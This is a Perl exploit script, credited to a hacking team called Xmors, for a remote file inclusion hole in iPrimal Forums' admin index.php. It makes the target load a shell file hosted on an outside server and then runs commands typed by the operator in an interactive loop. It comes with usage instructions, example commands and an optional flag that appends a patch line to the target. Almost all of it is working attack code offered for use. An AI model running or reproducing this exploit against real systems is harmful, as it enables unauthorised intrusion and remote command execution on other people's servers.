#!/usr/bin/perl
# """""""""""""""""""""""""""""""""""""""""""""""
# """  ::     ::                :::::   ::::  """
# """   ::   ::                 ::  :   ::    """
# """     ::::    ::   :: ::::: :::::   ::::  """
# """    ::  ::   ::: ::: :: :: ::  ::    ::  """
# """  ::      :: :: :  : ::::: ::   :: ::::  """
# """                                         """
# """""""""""""""""""""""""""""""""""""""""""""""
#        Xmor$ DigitaL Hacking TeaM
# iPrimal Forums (index.php) Remote File Include  Exploit
# Expl0iter by .... : the_Edit0r   
# Location .......... : Iran
# Class..............  : Remote
# Original Advisory : http://Www.Xmors.com ( Pablic ) 
http://Www.Xmors.net (pirv8)
# We ArE : Scorpiunix , KAMY4r , Sh3ll , SilliCONIC , Zer0.C0d3r
#     D3vil_B0y_ir , Tornado , DarkAngel , Behbood
# <Spical TNX Irania Hackers :
#  ( Aria-Security , Crouz , virangar ,DeltaHacking , Iranhackers
#   Kapa TeaM , Ashiyane , Shabgard , Simorgh-ev, Virangar )

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$file = "/admin/index.php?p=";

if(!$target || !$shellsite)
{
    usage();
}

header();

print "Type 'exit' to quit";
print "[cmd]\$";
$cmd = <STDIN>;

while ($cmd !~ "exit")
{
    $xpl = LWP::UserAgent->new() or die;
        $req =
HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)
or die("\n\n Failed to connect.");
        $res = $xpl->request($req);
        $r = $res->content;
        $r =~ tr/[\n]/[&#234;]/;

    if (@ARGV[4] eq "-r")
    {
        print $r;
    }
    elsif (@ARGV[5] eq "-p")
    {
    # if not working change cmd variable to null and apply patch 
manually.
    $cmd = "echo if(basename(__FILE__) == 
basename(\$_SERVER['PHP_SELF'])) die(); >> index.php";
    print q
    {
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!                                Patch Applied                              
!!
!! Code added to index.php:                                                  
!!
!! if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                  
!!
!!    die();                                                                 
!!
!!                                                                           
!!
!! NOTE: Adding patch function has not been tested. If does not complie 
or   !!
!! there is an error, simply make cmd = null and add the patch code to       
!!
!! index.php                                                                 
!!
!!                                                                           
!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    }
    }
    else
    {
    print "[cmd]\$";
    $cmd = <STDIN>;
    }
}

sub header()
{
    print q
    {
................................................................
..                                                            ..
..  iPrimal Forums (index.php) Remote File Include  Exploit   ..
..                                                            ..
................................................................
..                                                            ..
..              Xmors NetWork Security TeaM                   ..
..                Code by : the_Edit0r                        ..
..                                                            ..
................................................................
..                                                            ..
..                  Www.Xmors.coM (Pablic)                    ..
..                  Www.Xmors.neT ( Pirv8)                    ..
................................................................

                   </\/\\/_ 10\/3 15 1|)\4/\/
    };
}

sub usage()
{
header();
    print q
    {
                ..............................
                            Usage

perl Expl0it.pl <Target website> <Shell Location> <CMD Variable> <-r> 
<-p>
<Target Website> - Path to target eg: www.SiteName.com
<Shell Location> - Path to shell eg: www.Sh3llserver.com/sh3ll.txt
<CMD Variable> - Shell command variable name eg: cmd
<r> - Show output from shell
<p> - index.php
                           Example

perl Expl0it.pl http://SiteName http://Sh3llserver/sh3ll.txt cmd -r -p


    };
exit();
}

